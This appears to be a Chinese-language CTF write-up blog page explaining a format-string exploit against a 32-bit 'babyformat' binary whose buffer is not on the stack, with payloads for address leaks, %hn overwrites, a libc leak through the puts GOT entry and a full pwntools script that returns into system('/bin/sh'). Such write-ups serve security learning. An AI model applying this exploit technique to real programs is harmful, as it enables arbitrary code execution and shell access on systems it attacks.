@@ -1,0 +1,1023 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="default">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.6.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.6.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.6.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '6.6.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="前言这两天做了一个CTF的题目，该题目的二进制链接。该题目的逻辑非常简单，就是接受输入，并将其打印，在打印的时候利用了printf函数，很明显是个format string漏洞。但由于格式化的字符串并没有在栈中，所以利用起来有一点困难，在此记录一下自己利用的方法。 格式化字符串漏洞 格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数 参考。  一般发生格">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次Format String的利用(格式化字符串不在栈上)">
+<meta property="og:url" content="http://bin2415.github.io/2018/07/29/format-string/index.html">
+<meta property="og:site_name" content="PCB博客">
+<meta property="og:description" content="前言这两天做了一个CTF的题目，该题目的二进制链接。该题目的逻辑非常简单，就是接受输入，并将其打印，在打印的时候利用了printf函数，很明显是个format string漏洞。但由于格式化的字符串并没有在栈中，所以利用起来有一点困难，在此记录一下自己利用的方法。 格式化字符串漏洞 格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数 参考。  一般发生格">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://bin2415.github.io/2018/07/29/format-string/security.png">
+<meta property="og:image" content="http://bin2415.github.io/2018/07/29/format-string/code.png">
+<meta property="og:image" content="http://bin2415.github.io/2018/07/29/format-string/stack.png">
+<meta property="og:image" content="http://bin2415.github.io/2018/07/29/format-string/macro_count.png">
+<meta property="og:image" content="http://bin2415.github.io/2018/07/29/format-string/write_everywhere.png">
+<meta property="og:updated_time" content="2018-12-23T05:33:53.004Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="记一次Format String的利用(格式化字符串不在栈上)">
+<meta name="twitter:description" content="前言这两天做了一个CTF的题目，该题目的二进制链接。该题目的逻辑非常简单，就是接受输入，并将其打印，在打印的时候利用了printf函数，很明显是个format string漏洞。但由于格式化的字符串并没有在栈中，所以利用起来有一点困难，在此记录一下自己利用的方法。 格式化字符串漏洞 格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数 参考。  一般发生格">
+<meta name="twitter:image" content="http://bin2415.github.io/2018/07/29/format-string/security.png">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="PCB博客" type="application/atom+xml">
+
+
+
+
+  <link rel="canonical" href="http://bin2415.github.io/2018/07/29/format-string/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>记一次Format String的利用(格式化字符串不在栈上) | PCB博客</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion .logo-line-before i { left: initial; }
+    .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">PCB博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">快乐记录每一天</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://bin2415.github.io/2018/07/29/format-string/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="binpang">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="PCB博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">记一次Format String的利用(格式化字符串不在栈上)
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-07-29 14:50:37" itemprop="dateCreated datePublished" datetime="2018-07-29T14:50:37+08:00">2018-07-29</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2018-12-23 13:33:53" itemprop="dateModified" datetime="2018-12-23T13:33:53+08:00">2018-12-23</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这两天做了一个CTF的题目，该题目的二进制<a href="./babyformat">链接</a>。该题目的逻辑非常简单，就是接受输入，并将其打印，在打印的时候利用了printf函数，很明显是个format string漏洞。但由于格式化的字符串并没有在栈中，所以利用起来有一点困难，在此记录一下自己利用的方法。</p>
+<h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><blockquote>
+<p>格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/fmtstr_intro/" target="_blank" rel="noopener">参考</a>。</p>
+</blockquote>
+<p>一般发生格式化字符串漏洞的原因是因为并没有指定第一个参数格式化字符串(或者格式化字符串可以更改)，所以给了攻击者一个可以控制格式化字符串的机会，进而可以实现任意的内存读写能力。其中能触发格式化字符串漏洞的函数有如下几个: scanf, printf, vprintf, vfprintf, sprintf, vsprintf, vsnprintf, setproctitle, syslog等，如果想比较系统的了解格式化字符串漏洞，可以访问<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/fmtstr_intro/" target="_blank" rel="noopener">链接</a>。</p>
+<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>首先拿到程序，先分析一下该程序的保护措施:</p>
+<p><img src="/2018/07/29/format-string/./security.png" alt="security"></p>
+<p>发现其除了canary保护之外，其它防护都开了(主要是输入的buff并不在栈上，所以并没有canary保护，并不代表着可以通过buffer overflow来溢出返回地址-_-)。</p>
+<p>然后扔给IDA pro分析其逻辑:</p>
+<p><img src="/2018/07/29/format-string/./code.png" alt="code"></p>
+<p>该程序的逻辑非常简单，首先是给你三次机会，让你进行格式化字符串攻击，COUNT是全局变量，COUNT=3。接下来是exploit_me函数，该函数的逻辑更加简单，现将BUFF变量清空，然后读入13个字节，再将输入的字符串输出，在输出的时候会发生格式化字符串的攻击。其中BUFF是一个全局变量，大小是16个字节。该程序攻击起来主要有如下几个难点:</p>
+<ul>
+<li>由于输入的长度有限(只有13个字节)，并且只允许进行三次尝试</li>
+<li>格式化字符串不在栈上，进行任意内存的读写存在一定的难度</li>
+</ul>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>接下来主要针对以上提出来的两个难点进行攻击。</p>
+<h3 id="修改计数变量"><a href="#修改计数变量" class="headerlink" title="修改计数变量"></a>修改计数变量</h3><p>由于只允许三次输入，并且输入的长度有限，很难进行有效的攻击，所以接下来思路就是首先利用这三次输入将控制输入的计数变量修改掉，使其能够进行多次输入。</p>
+<p>有上面程序分析可以看到，计数变量有两个：MACRO_COUNT局部变量和COUNT全局变量，只要将其中一个值修改掉，就可以进行多次输入，方便进行接下来的攻击。所以现在思路主要如下：</p>
+<ul>
+<li>泄露地址：包括栈的地址和程序的地址。</li>
+<li>修改栈的内容：保证栈中有MACRO_COUNT或者COUNT的地址。</li>
+<li>修改MACRO_COUNT或者COUNT的值。</li>
+</ul>
+<p>以上的每一个目的都可以利用一次format string攻击实现。</p>
+<h4 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h4><p><img src="/2018/07/29/format-string/./stack.png" alt="stack"></p>
+<p>上面该图是在printf调用前的栈的内容，可以看出第一个参数是格式化字符串的地址，而接下来的一个内存单元0xffffcf6c存储的也是格式化字符串的地址，所以可以通过泄露该内存单元的内容来泄露BUFF变量的地址，从而可以算出程序的基址。接下来，ebp的内存单元存储的是saved ebp，上一个函数的ebp值，该值是栈的地址，所以可以通过泄露该地址来泄露栈的地址。所以可以输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%p%6$p</span><br></pre></td></tr></table></figure>
+<p>来泄露栈的地址和程序的地址。</p>
+<h4 id="修改栈的内容"><a href="#修改栈的内容" class="headerlink" title="修改栈的内容"></a>修改栈的内容</h4><p>由于格式化字符串不在栈上，所以想通过格式化字符串来修改某个内存单元的值，首先得先把该内存的地址写入栈中。通过上面分析我们知道了栈上的地址和程序的地址，通过偏移也能计算出MACRO_COUNT和COUNT的地址。接下来则需要将MACRO_COUNT或者COUNT的地址写入栈中。在此，我选择将MACRO_COUNT的地址写入到栈中，理由如下:</p>
+<p><img src="/2018/07/29/format-string/./macro_count.png" alt="macro count"></p>
+<p>从上图可以看到0xffffcf84地址处存储的是内存单元0xffffd044的地址，而0xffffd044存储的值是0xffffd224，也是栈上的一个地址，而MACRO_COUNT也是栈上的变量，其地址与0xffffd224的高16位应该是相等的，所以此时只需要修改0xffffd044地址存储的低16位即可。这样能保证攻击顺利进行（如果修改整个32位的话，则输出的数太多，需要花费很长时间，还有一个原因是导致输入的字符串过长，没办法实现攻击）。</p>
+<p>所以具体的攻击手段就是将0xffffd044内存单元存储的值的低16位改为MACRO_COUNT的高位byte地址即可。</p>
+<p>假设MACRO_COUNT的地址为addr。<br>则可以输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;%&quot; + str(addr &amp; 0xffff) + &quot;d&quot; + &quot;%9$hn&quot;</span><br></pre></td></tr></table></figure>
+<p>即可。</p>
+<h4 id="修改MACRO-COUNT的值"><a href="#修改MACRO-COUNT的值" class="headerlink" title="修改MACRO_COUNT的值"></a>修改MACRO_COUNT的值</h4><p>通过前面的步骤，实现了将0xffffd224的地址处存储了MACRO_COUNT的地址，而0xffffd044相对于0xffffcf60(printf的第一个参数)的offset为0xE4,则可以进行如下输入使的MACRO_COUNT的高位为0xFF。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;%255d%57$hhn&quot;</span><br></pre></td></tr></table></figure>
+<p>其中57为0xE4/4，因为地址是4字节的。</p>
+<h3 id="读写任意内存"><a href="#读写任意内存" class="headerlink" title="读写任意内存"></a>读写任意内存</h3><p>通过以上的努力，我们可以进行多次的输入。由于输入的格式化字符串是全局变量，并不在栈上，我们就不能通过一次简单的输入就能读写任意内存，此时需要通过格式化字符串来间接的修改内存地址到栈上。具体思路如下：</p>
+<p>如果我想要将地址addr写入到栈上的某个内存单元上去，设栈上的该内存单元地址为stack_addr。则我需要一次中介来完成此类攻击。</p>
+<p>我们再来看一下调用printf时栈中的布局：</p>
+<p><img src="/2018/07/29/format-string/./write_everywhere.png" alt="write_everywhere"></p>
+<p>可以看到0xffffcf84和0xffffcf88两个内存单元存储的内容是栈上的地址，而其又指向了一个栈上的地址。所以可以通过格式化字符串将0xffffd044地址处的内容改为stack_addr+2，将0xffffd04c地址处的内容改为stack_addr，然后再通过$hn分别向stack_addr+2处写入addr的高16位((addr&amp;0xffff0000)&gt;&gt;16)，stack_addr处写入addr的低16位(addr&amp;0xffff)。</p>
+<p>具体的攻击过程如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span><span class="params">(address, modifiedAddress)</span>:</span></span><br><span class="line">    print(<span class="string">"modified address is %x"</span> % modifiedAddress)</span><br><span class="line">    <span class="comment">#puts_got_run = puts_got + binary_base</span></span><br><span class="line">    modifiedAddress_high = (modifiedAddress &amp; <span class="number">0xffff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">    <span class="comment">#log.info("strcmp got run high %x " % strncmp_got_run_high)</span></span><br><span class="line">    modifiedAddress_low = modifiedAddress &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">    temp_low = (address + <span class="number">0x2</span>) &amp; <span class="number">0xffff</span></span><br><span class="line">    print(<span class="string">"temp low is %x"</span> % temp_low)</span><br><span class="line">    payload3 = <span class="string">"%"</span>+str(temp_low) + <span class="string">"d"</span> + <span class="string">"%9$hn"</span></span><br><span class="line">    p.sendline(payload3)</span><br><span class="line">    p.recvrepeat(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    temp_high = (address) &amp; <span class="number">0xffff</span></span><br><span class="line">    print(<span class="string">"temp high is %x"</span> % temp_high)</span><br><span class="line">    payload4 = <span class="string">"%"</span> + str(temp_high) + <span class="string">"d"</span> + <span class="string">"%10$hn"</span></span><br><span class="line">    p.sendline(payload4)</span><br><span class="line">    p.recvrepeat(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    payload5 = <span class="string">"%"</span> + str(modifiedAddress_high)+<span class="string">"d"</span> + <span class="string">"%57$hn"</span></span><br><span class="line">    print(<span class="string">"got run high is %x "</span> % (modifiedAddress_high))</span><br><span class="line">    p.sendline(payload5)</span><br><span class="line">    <span class="comment"># p.recv()</span></span><br><span class="line">    <span class="comment"># sleep(1)</span></span><br><span class="line">    p.recvrepeat(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    payload6 = <span class="string">"%"</span> + str(modifiedAddress_low)+<span class="string">"d"</span>+<span class="string">"%59$hn"</span></span><br><span class="line">    print(<span class="string">"got run low is %x "</span> % (modifiedAddress_low))</span><br><span class="line">    p.sendline(payload6)</span><br><span class="line">    p.recvrepeat(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure>
+<p>其中address就是此处的stack_addr，modifiedAddress就是此处的addr。</p>
+<p>有了可以向栈中写入任意地址的能力，我们就可以进行libc地址的泄露和修改返回地址及其参数了。</p>
+<h4 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h4><p>通过以上的方法，我们可以将printf函数的got地址写入到栈上，然后通过%s读取got的内容，从而泄露libc的地址。<br>由于改题目并没有提供具体的libc版本，所以可以通过泄露的printf的地址，到<a href="https://libc.blukat.me/" target="_blank" rel="noopener">libc database search</a>网站进行查询。通过绣楼libc地址，我们可以得到system的地址和”/bin/sh”字符串的地址。</p>
+<h4 id="修改返回地址和参数"><a href="#修改返回地址和参数" class="headerlink" title="修改返回地址和参数"></a>修改返回地址和参数</h4><p>由于泄露了libc的地址，所以将main函数的返回地址修改为system的地址，并将其参数设为”/bin/sh”字符串的地址，输入EXIT，即可完成攻击。</p>
+<p>整个的攻击脚本如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span><span class="params">(address, modifiedAddress)</span>:</span></span><br><span class="line">    print(<span class="string">"modified address is %x"</span> % modifiedAddress)</span><br><span class="line">    <span class="comment">#puts_got_run = puts_got + binary_base</span></span><br><span class="line">    modifiedAddress_high = (modifiedAddress &amp; <span class="number">0xffff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">    <span class="comment">#log.info("strcmp got run high %x " % strncmp_got_run_high)</span></span><br><span class="line">    modifiedAddress_low = modifiedAddress &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">    temp_low = (address + <span class="number">0x2</span>) &amp; <span class="number">0xffff</span></span><br><span class="line">    print(<span class="string">"temp low is %x"</span> % temp_low)</span><br><span class="line">    payload3 = <span class="string">"%"</span>+str(temp_low) + <span class="string">"d"</span> + <span class="string">"%9$hn"</span></span><br><span class="line">    p.sendline(payload3)</span><br><span class="line">    p.recvrepeat(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    temp_high = (address) &amp; <span class="number">0xffff</span></span><br><span class="line">    print(<span class="string">"temp high is %x"</span> % temp_high)</span><br><span class="line">    payload4 = <span class="string">"%"</span> + str(temp_high) + <span class="string">"d"</span> + <span class="string">"%10$hn"</span></span><br><span class="line">    p.sendline(payload4)</span><br><span class="line">    p.recvrepeat(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    payload5 = <span class="string">"%"</span> + str(modifiedAddress_high)+<span class="string">"d"</span> + <span class="string">"%57$hn"</span></span><br><span class="line">    print(<span class="string">"got run high is %x "</span> % (modifiedAddress_high))</span><br><span class="line">    p.sendline(payload5)</span><br><span class="line">    <span class="comment"># p.recv()</span></span><br><span class="line">    <span class="comment"># sleep(1)</span></span><br><span class="line">    p.recvrepeat(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    payload6 = <span class="string">"%"</span> + str(modifiedAddress_low)+<span class="string">"d"</span>+<span class="string">"%59$hn"</span></span><br><span class="line">    print(<span class="string">"got run low is %x "</span> % (modifiedAddress_low))</span><br><span class="line">    p.sendline(payload6)</span><br><span class="line">    p.recvrepeat(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./babyformat')</span></span><br><span class="line">pp = ELF(<span class="string">'./babyformat'</span>)</span><br><span class="line">p = remote(<span class="string">'104.196.99.62'</span>, port = <span class="number">2222</span>)</span><br><span class="line">p.recvuntil(<span class="string">'==== Baby Format - Echo system ===='</span>)</span><br><span class="line"></span><br><span class="line">puts_got = pp.got[<span class="string">'puts'</span>]</span><br><span class="line"><span class="comment"># puts_offset = 0x5fca0</span></span><br><span class="line"><span class="comment"># bin_sh_offset = 0x15ba0b</span></span><br><span class="line"><span class="comment"># system_offset = 0x3ada0</span></span><br><span class="line">system_offset = <span class="number">0x3cd10</span></span><br><span class="line">puts_offset = <span class="number">0x67360</span></span><br><span class="line">bin_sh_offset = <span class="number">0x17b8cf</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## leak address</span></span><br><span class="line">p.sendline(<span class="string">'%p%6$p'</span>)</span><br><span class="line"><span class="comment">#sleep(3)</span></span><br><span class="line">p.recvline()</span><br><span class="line">leaked = p.recvline()</span><br><span class="line">addr_buff = int(leaked[<span class="number">2</span>:<span class="number">10</span>], <span class="number">16</span>)</span><br><span class="line">binary_base = addr_buff - <span class="number">0x202c</span> </span><br><span class="line">log.info(<span class="string">"BUFF address is %x"</span> % addr_buff)</span><br><span class="line">addr_stack_ebp = int(leaked[<span class="number">12</span>:<span class="number">20</span>], <span class="number">16</span>) - <span class="number">0x20</span></span><br><span class="line">log.info(<span class="string">"ebp address is %x"</span> % addr_stack_ebp)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ebp_low_four = addr_stack_ebp &amp; 0xffff</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># variable MACRO_COUNT address's low four bytes</span></span><br><span class="line">count_low_four = (addr_stack_ebp + <span class="number">0x17</span>) &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"%"</span> + str(count_low_four) + <span class="string">"d"</span> + <span class="string">"%9$hn"</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvrepeat(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"%255d%57$hhn"</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.recvrepeat(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">####### No problem up ##############################</span></span><br><span class="line"></span><br><span class="line">puts_got_run = puts_got + binary_base</span><br><span class="line">modify(addr_stack_ebp + <span class="number">0x20</span>, puts_got_run)</span><br><span class="line"></span><br><span class="line">p.recvrepeat(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#leak the strncmp address</span></span><br><span class="line">payload7 = <span class="string">"%14$s"</span></span><br><span class="line">p.sendline(payload7)</span><br><span class="line"><span class="comment"># print(p.recv())</span></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line">puts_address = u32(p.recvline()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">log.info(<span class="string">"puts address is %x "</span> % puts_address)</span><br><span class="line">libc_base = puts_address - puts_offset</span><br><span class="line">log.info(<span class="string">"libc base address is %x"</span> % libc_base)</span><br><span class="line"></span><br><span class="line"><span class="comment">#############leak libc address done ############</span></span><br><span class="line"></span><br><span class="line">ret_address = addr_stack_ebp + <span class="number">0x34</span></span><br><span class="line">arg_address = addr_stack_ebp + <span class="number">0x3c</span></span><br><span class="line"></span><br><span class="line">system_address = system_offset + libc_base</span><br><span class="line">bin_sh_address = bin_sh_offset + libc_base</span><br><span class="line"></span><br><span class="line">modify(ret_address, system_address)</span><br><span class="line">modify(arg_address, bin_sh_address)</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">p.recvrepeat(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#p.sendline('EXIT')</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol>
+<li>ctf-wiki:格式化字符串漏洞原理介绍: <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/fmtstr_intro/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/fmtstr_intro/</a></li>
+<li>lib database search: <a href="https://libc.blukat.me/" target="_blank" rel="noopener">https://libc.blukat.me/</a></li>
+</ol>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+        </div>
+      
+
+      
+      
